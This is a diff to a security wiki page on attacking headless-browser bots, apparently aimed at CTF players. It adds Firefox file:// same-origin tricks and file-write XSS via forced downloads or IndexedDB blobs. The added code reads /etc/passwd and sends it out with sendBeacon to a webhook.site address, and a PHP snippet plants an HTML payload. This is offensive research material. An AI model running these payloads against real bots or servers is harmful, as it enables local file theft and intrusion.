@@ -6,7 +6,7 @@ description: >-
 
 # Headless Browsers
 
-When dealing with a headless browser, by far the most commonly used variant is Chromium. Automation libraries have the choice between [#chrome-devtools-protocol-cdp](headless-browsers.md#chrome-devtools-protocol-cdp "mention") and the W3C-standardized [#chromedriver](headless-browsers.md#chromedriver "mention") to send actions to the process, and your options really depend on which is used:
+When dealing with a headless browser, by far the most commonly used variant is Chromium, but some tricks for Firefox have been included as well. Automation libraries have the choice between [#chrome-devtools-protocol-cdp](headless-browsers.md#chrome-devtools-protocol-cdp "mention") and the W3C-standardized [#chromedriver](headless-browsers.md#chromedriver "mention") to send actions to the process, and your options really depend on which is used:
 
 * **Chrome DevTools Protocol**: [Puppeteer](https://pptr.dev/), [Playwright](https://playwright.dev/)
 * **Chromedriver**: [Selenium](https://selenium-python.readthedocs.io/)
@@ -42,7 +42,11 @@ Another more niche fact is that, strangely, [Cache Partitioning](https://develop
 Interacting with elements like through [`Page.click()`](https://pptr.dev/api/puppeteer.page.click) in Puppeteer work by locating the _position_ of the selected element, and clicking on the page in the center of that element. That means they are also vulnerable to **clickjacking** just like us humans, by positioning an iframe above the targeted button, you can make it click something inside the iframe.\
 This idea also extends to the **keyboard**, if it tries to fill out some input with a text, it will type the string out including **spaces**. If it's not selected an input at all, but instead focused a button on some other page while typing, the space press may actually _press the button_!
 
-## SSRF
+## Fetching
+
+Resources that can unintentionally be fetched through the browser
+
+### SSRF
 
 The headless browser often runs on some server, which may also include more applications locally or in an internal network. You can try to use it as an SSRF by loading resources such as **iframes** or simply navigating to it. The protocol you may navigate to depends on the protocol you currently have, if your content is hosted on `http:` or `https:`, you can only go to one of those addresses.\
 But if your content is hosted on a `file:` URL, you are allowed to `<iframe>` other files, such as:
@@ -104,6 +108,75 @@ processInPool(PORTS, POOL_SIZE).then(() => {
 From here, you can try to attack the found ports through the browser, and if you find an XSS, possibly abuse what's explained in [#chromedriver](headless-browsers.md#chromedriver "mention").
 
 You'll also often see these headless instances running in isolated docker containers. In this case you may be able to connect to other internal docker IPs in the `172.16.0.0/16` range.
+
+### `file://` protocol
+
+#### Firefox Puppeteer same-origin
+
+The Firefox `security.fileuri.strict_origin_policy` preference is set to `false` for both [Puppeteer](https://github.com/puppeteer/puppeteer/blob/9f7488163a6277140440a95015240ef06ce915a5/packages/browsers/src/browser-data/firefox.ts#L384) and [Playwright](https://github.com/microsoft/playwright/blob/80f93258aa5892870cd875079d71cd4a2a181626/browser_patches/firefox/preferences/playwright.cfg#L317). This means:
+
+> Local documents have access to all other local documents, including directory listings.
+
+In other words, the [Same-origin policy](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy) that normally prevents `file://A` from reading `file://B` is no longer in effect. Any XSS on a `file://` URI can just fetch other files and even list directories to find paths. For example:
+
+```javascript
+const content = await fetch('file:///etc/passwd').then(e => e.text());
+navigator.sendBeacon("https://webhook.site/...", content);  // Sends a POST request
+```
+
+#### File write XSS
+
+As shared in the [Sourceless challenge during Google CTF 2025](https://gist.github.com/terjanq/4cb40653760c1ba8c33ee06be098d508), there are two main ways of getting a file on the system to achieve XSS from a `file://` origin. The first is to simply trigger an automatic download of a `.html` file (note that this may require HTTPS to prevent a suffix from being added).
+
+```php
+<?php
+header('Content-Disposition: attachment; filename="exploit.html"');
+?>
+<script>alert(origin)</script>
+```
+
+Which will store it by default to the running user's home directory under the `Downloads/` directory. If the application allows it, you can then visit it through `file:///home/user/Downloads/exploit.html`.
+
+If downloading files is disabled, but a `userDataDir` is set, [IndexedDB](https://developer.mozilla.org/en-US/docs/Web/API/IndexedDB_API) can write raw blobs to the filesystem to a predictable path in _Firefox_:
+
+<pre class="language-javascript"><code class="lang-javascript">const html = `&#x3C;!DOCTYPE html>&#x3C;html>&#x3C;body>
+  &#x3C;script>
+    (async () => {
+<strong>      const content = await fetch('file:///etc/passwd').then(e => e.text());
+</strong><strong>      navigator.sendBeacon("https://webhook.site/...", content);
+</strong>    })();
+  &#x3C;\/script>
+`;
+const blob = new Blob([html], { type: "text/html" });
+
+(async () => {
+  const store = "files";
+  const db = await new Promise((resolve, reject) => {
+    const request = indexedDB.open("db", 1);
+    request.onupgradeneeded = () => request.result.createObjectStore(store);
+    request.onsuccess = () => resolve(request.result);
+    request.onerror = () => reject(request.error);
+  });
+  const tx = db.transaction(store, "readwrite");
+  tx.objectStore(store).put(blob, "blob1");
+  await tx.done;
+  db.close();
+})();
+</code></pre>
+
+Take the `userDataDir` (for example, `/tmp/firefox-userdata`) and search for your given text:
+
+<pre class="language-shell-session" data-overflow="wrap"><code class="lang-shell-session">$ grep -r -F '&#x3C;script>' /tmp/firefox-userdata
+<strong>/tmp/firefox-userdata/storage/default/http+++host.docker.internal+8000/idb/548905059db.files/1:  &#x3C;script>
+</strong></code></pre>
+
+You can now let the bot visit this path to exploit the vulnerability explained earlier, and receive the contents of `/etc/passwd` in your webhook (note the `+` characters might need to be URL-encoded).
+
+{% code title="URL" overflow="wrap" %}
+```
+file:///tmp/firefox-userdata/storage/default/http+++host.docker.internal+8000/idb/548905059db.files/1
+```
+{% endcode %}
 
 ## Chrome DevTools Protocol (CDP)
 
